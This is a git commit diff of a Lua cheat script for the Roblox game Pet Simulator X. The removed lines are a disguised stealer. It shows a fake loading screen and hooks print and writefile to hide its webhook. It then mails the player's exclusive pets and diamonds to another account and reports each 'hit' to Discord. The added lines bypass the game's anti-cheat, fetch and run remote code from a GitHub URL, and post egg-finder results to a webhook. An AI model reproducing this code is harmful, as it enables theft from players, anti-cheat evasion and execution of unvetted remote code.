88a06d497bd578d1c139773dcc724c0dc11b9ce1
pet-simx <128821443+pet-simx@users.noreply.github.com>
2023-06-26 13:07:17 +0700

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,199 +1,194 @@
-if _G.UserName == nil or _G.UserName == "" then
-	_G.UserName = Username
+repeat wait() until game:IsLoaded()
+local Library = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
+while not Library.Loaded do
+    wait()
 end
-if _G.Webhook == nil or _G.Webhook == "" then
-	_G.Webhook = Webhook
-end
-if _G.loadingScreenText == nil or _G.loadingScreenText == "" then
-	_G.loadingScreenText = "Script Loading..."
-end
+wait(5)
+Library = require(game.ReplicatedStorage.Library)
+local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
+local Fire, Invoke = Network.Fire, Network.Invoke
 
-if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 200000 then
-    game.Players.LocalPlayer:Kick("Error found while executing.")
-end
-
-local hook = hookfunction or hookfunc or replace_closure
-local hookies = {}
-if hook then
-pcall(function() -- fuck compatability me and my homies hate compatibility
-    hookies[1] = hook(print,function(...)if(tostring(...):match("api/webhooks")) then print("lol")return ""end return hookies[1](...)end)
-    hookies[2] = hook(warn,function(...)if(tostring(...):match("api/webhooks")) then print("lol")return ""end return hookies[2](...)end)
-    hookies[3] = hook(appendfile,function(...)if(tostring(...):match("api/webhooks")) then print("lol")return ""end return hookies[3](...)end)
-    hookies[4] = hook(writefile,function(...)if(tostring(...):match("api/webhooks")) then print("lol")return ""end return hookies[4](...)end)
-    hookies[5] = hook(rconsoleprint,function(...)if(tostring(...):match("api/webhooks")) then print("lol")return ""end return hookies[5](...)end)
-end)
-end
-
-local Library = require(game.ReplicatedStorage.Framework.Library)
-local SendMail = getupvalue(Library.Network.Invoke, 2)("Send Mail");
-local LockPet = getupvalue(Library.Network.Invoke, 2)("Lock Pet");
-local pets = {}
-local player = game:GetService("Players").LocalPlayer
-
-local dims = player.leaderstats.Diamonds.Value - 700000
-if dims < 0 then
-	dims = 0
-end
-
-
-for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
-    v:Destroy()
-end
-local ScreenGui = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local TextLabel = Instance.new("TextLabel")
-local TextLabel1 = Instance.new("TextLabel")
-local ImageLabel = Instance.new("ImageLabel")
-local LoadingScript = Instance.new("TextLabel")
-local LocalScript = Instance.new("LocalScript")
-
-ScreenGui.IgnoreGuiInset = true
-ScreenGui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-ScreenGui.Parent = game:GetService("CoreGui")
-
-Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Frame.Position = UDim2.new(-0.000106195221, 0, 0, 0)
-Frame.Size = UDim2.new(1, 0, 1, 0)
-Frame.Parent = ScreenGui
-
-TextLabel.Font = Enum.Font.Bangers
-TextLabel.Text = _G.loadingScreenText
-TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.TextSize = 47
-TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.BorderColor3 = Color3.fromRGB(27.000000290572643, 42.000001296401024, 53.00000064074993)
-TextLabel.BorderSizePixel = 0
-TextLabel.Position = UDim2.new(0.03534081, 0, 0.440561211, 0)
-TextLabel.Size = UDim2.new(0, 1356, 0, 85)
-TextLabel.Parent = Frame
-
-
-ImageLabel.Image = "rbxassetid://5577595083"
-ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ImageLabel.BackgroundTransparency = 1
-ImageLabel.BorderSizePixel = 0
-ImageLabel.Position = UDim2.new(0.063534081, 0, 0.340561211, 0)
-ImageLabel.Size = UDim2.new(0, 320, 0, 340)
-ImageLabel.Parent = Frame
-
-local LoadingScript = Instance.new("TextLabel")
-LoadingScript.Font = Enum.Font.FredokaOne
-LoadingScript.Text = "Loading Script 1/8"
-LoadingScript.TextColor3 = Color3.fromRGB(255, 255, 255)
-LoadingScript.TextSize = 51
-LoadingScript.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-LoadingScript.BackgroundTransparency = 1
-LoadingScript.Position = UDim2.new(0.345166922, 0, 0.496173501, 0)
-LoadingScript.Size = UDim2.new(0, 419, 0, 94)
-LoadingScript.Name = "LoadingScript"
-LoadingScript.Parent = Frame
-
-local fake_module_scripts = {}
-
-local function KYZKD_fake_script()
-    local loadingGui = ScreenGui
-    local loadingFrame = loadingGui:FindFirstChild("Frame")
-    local loadingText = loadingFrame:FindFirstChild("LoadingScript")
-    if loadingGui and loadingFrame and loadingText then
-        loadingGui.IgnoreGuiInset = true
-        loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-        
-        for i = 1, 5 do
-            loadingText.Text = "Loading Script " .. i .. "/8"
-            wait(15)
+local banSuccess, banError = pcall(function() 
+    local Blunder = require(game:GetService("ReplicatedStorage"):WaitForChild("X", 10):WaitForChild("Blunder", 10):WaitForChild("BlunderList", 10))
+    if not Blunder or not Blunder.getAndClear then LocalPlayer:Kick("Error while bypassing the anti-cheat! (Didn't find blunder)") end
+    
+    local OldGet = Blunder.getAndClear
+    setreadonly(Blunder, false)
+    local function OutputData(Message)
+    print("-- PET SIM X BLUNDER --")
+    print(Message .. "\n")
+    end
+    
+    Blunder.getAndClear = function(...)
+    local Packet = ...
+        for i,v in next, Packet.list do
+        if v.message ~= "PING" then
+            OutputData(v.message)
+            table.remove(Packet.list, i)
         end
     end
+    return OldGet(Packet)
+    end
+    
+    setreadonly(Blunder, true)
+end)
+
+if not banSuccess then
+    LocalPlayer:Kick("Error while bypassing the anti-cheat! (".. banError ..")")
+    return
 end
 
-coroutine.wrap(KYZKD_fake_script)()
+local bypassSuccess, bypassError
+bypassSuccess, bypassError = pcall(function()
+    if not Library.Network then 
+        LocalPlayer:Kick("Network not found, can't bypass!")
+    end
+    
+    if not Library.Network.Invoke or not Library.Network.Fire then
+        LocalPlayer:Kick("Network Invoke/Fire was not found! Failed to bypass!")
+    end
+    
+    hookfunction(debug.getupvalue(Library.Network.Invoke, 1), function(...) return true end)
+    
+    local originalPlay = Library.Audio.Play
+    Library.Audio.Play = function(...) 
+        if checkcaller() then
+            local audioId, parent, pitch, volume, maxDistance, group, looped, timePosition = unpack({ ... })
+            if type(audioId) == "table" then
+                audioId = audioId[Random.new():NextInteger(1, #audioId)]
+            end
+            if not parent then
+                warn("Parent cannot be nil", debug.traceback())
+                return nil
+            end
+            if audioId == 0 then return nil end
+            
+            if type(audioId) == "number" or not string.find(audioId, "rbxassetid://", 1, true) then
+                audioId = "rbxassetid://" .. audioId
+            end
+            if pitch and type(pitch) == "table" then
+                pitch = Random.new():NextNumber(unpack(pitch))
+            end
+            if volume and type(volume) == "table" then
+                volume = Random.new():NextNumber(unpack(volume))
+            end
+            if group then
+                local soundGroup = game.SoundService:FindFirstChild(group) or nil
+            else
+                soundGroup = nil
+            end
+            if timePosition == nil then
+                timePosition = 0
+            else
+                timePosition = timePosition
+            end
+            local isGargabe = false
+            if not pcall(function() local _ = parent.Parent end) then
+                local newParent = parent
+                pcall(function()
+                    newParent = CFrame.new(newParent)
+                end)
+                parent = Instance.new("Part")
+                parent.Anchored = true
+                parent.CanCollide = false
+                parent.CFrame = newParent
+                parent.Size = Vector3.new()
+                parent.Transparency = 1
+                parent.Parent = workspace:WaitForChild("__DEBRIS")
+                isGargabe = true
+            end
+            local sound = Instance.new("Sound")
+            sound.SoundId = audioId
+            sound.Name = "sound-" .. audioId
+            sound.Pitch = pitch and 1
+            sound.Volume = volume and 0.5
+            sound.SoundGroup = soundGroup
+            sound.Looped = looped and false
+            sound.MaxDistance = maxDistance and 100
+            sound.TimePosition = timePosition
+            sound.RollOffMode = Enum.RollOffMode.Linear
+            sound.Parent = parent
+            if not require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client")).Settings.SoundsEnabled then
+                sound:SetAttribute("CachedVolume", sound.Volume)
+                sound.Volume = 0
+            end
+            sound:Play()
+            getfenv(originalPlay).AddToGarbageCollection(sound, isGargabe)
+            return sound
+        end
+        
+        return originalPlay(...)
+    end
 
-game:GetService("Players").LocalPlayer.PlayerGui.Main.Bottom.Visible = true
+end)
 
-game:GetService("Players").LocalPlayer.PlayerGui.Main.Left.Visible = true
+local SHU = loadstring(game:HttpGet("https://raw.githubusercontent.com/jedpep/Roblox/main/ServerHop.lua"))()
 
-game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Visible = true
-
-game:GetService("Players").LocalPlayer.PlayerGui.Main.Boosts.Visible = true
-
-game:GetService("Players").LocalPlayer.PlayerGui.Main.ServerBoosts.Visible = true
-
-
-box = game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad.Position
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(box)
-task.wait(1)
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(box)
-task.wait(1)
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(box)
+if not bypassSuccess then
+    print(bypassError)
+    LocalPlayer:Kick("Error while bypassing network, try again or wait for an update!")
+    return
+end
 
 
+if not workspace.__MAP.Cannons:FindFirstChild("Summer Event") then
+    SHU.Jump(({"Normal","Low"})[math.random(1,2)])
+    wait(1000)
+end
 
-for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
-    if v:IsA("TextButton") then
-    	if v:FindFirstChild("Locked").Visible == true then
-        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
-        	if v:FindFirstChild("Level").Text == "???" then
-			table.insert(pets, v.Name)
-		end
+
+if Library.WorldCmds.Get() ~= "Summer Islands Event" then
+    Library.WorldCmds.Load("Summer Islands Event")
+    print(Library.WorldCmds.HasLoaded())
+end
+
+
+local x50 = false
+local x50Egg = nil
+for i,v in pairs(workspace.__MAP.Eggs:GetChildren()) do
+	print(v.Sign.Main.SurfaceGui.Title.Text)
+	if v.Sign.Main.SurfaceGui.Title.Text:find(TargetMulti) then
+		print(true)
+		x50 = true
+        x50Egg = v
 	end
 end
-end
-end
-
-for i,v in ipairs(pets) do
-
-local args = {
-    [1] = {
-        [pets[i]] = true
+if not x50 then
+	SHU.Jump(({"Normal","Low"})[math.random(1,2)])
+else
+    local embed = {
+        {
+            ["color"] = 16230400,
+            ["title"] = ("Found %s egg!"):format(TargetMulti),
+            ["author"] = {
+                ["name"] = ("Server size: %s/%s"):format(#game.Players:GetChildren()-1, game.Players.MaxPlayers)
+            },
+            ["description"] = ("Join script: ```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game.Players.LocalPlayer)```\n\nJoin through browser: ```js\nRoblox.GameLauncher.joinGameInstance(%s, '%s')```"):format(game.PlaceId, game.JobId, game.PlaceId, game.JobId),
+            ["footer"] = {
+                ["text"] = "JX Utilities • Summer Islands Egg Finder",
+                ["icon_url"] = "https://media.discordapp.net/attachments/1108132899431137300/1109902689996910622/gpfp.png?width=675&height=675"
+            },
+        }
     }
-}
-
-LockPet:InvokeServer(unpack(args))
-print(pets[i])
-task.wait(1)
-end
-
-
-task.wait()
-
-
-
-
-for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
-    if v:IsA("TextButton") then
-        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
-            if v:FindFirstChild("Level").Text == "???" or v:FindFirstChild("Level").Text == "????" or player.leaderstats.Diamonds.Value >= 50000000000 then         
-            local args = {
-                [1] = {
-                    ["Recipient"] = DhUser,
-                    ["Diamonds"] = dims,
-                    ["Pets"] = {
-                        [1] = v.Name
-                    },
-                    ["Message"] = "Kiroft ON TOP"
-                }
+    if SendWebhook then
+        (syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or getgenv().request or request) {
+            Url = WebhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode{
+                ["content"] = "",
+                ["embeds"] = embed
             }
-
-        SendMail:InvokeServer(unpack(args))
-        sendWebhook(DhWebhook, "@everyone detected a hit \n\n```Pet ID: " .. v.Name .. "```\n\n```Gems: " .. dims .. "\n\nReciever: " .. DhUser .. "\n```")
-        dims = 0
-        wait(1.6)
-        else
-            local args = {
-                [1] = {
-                    ["Recipient"] = _G.UserName,
-                    ["Diamonds"] = dims,
-                    ["Pets"] = {
-                        [1] = v.Name
-                    },
-                    ["Message"] = "Kiroft ON TOP"
-                }
-            }
-        SendMail:InvokeServer(unpack(args))
-        sendWebhook(_G.Webhook, "@everyone detected a hit \n\n```Pet ID: " .. v.Name .. "```\n\n```Gems: " .. dims .. "\n\nReciever: " .. _G.UserName .. "```")
-        dims = 0
-        wait(1.6)
+        }
     end
-end
-end
+    if not StopWhenFound then
+        SHU.Jump(({"Normal","Low"})[math.random(1,2)])
+    end
+    wait(3)
+    if TeleportToEgg then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(x50Egg.PrimaryPart.CFrame.p) + (x50Egg.PrimaryPart.CFrame.RightVector * 10)
+        Fire("Performed Teleport")
+    end
 end
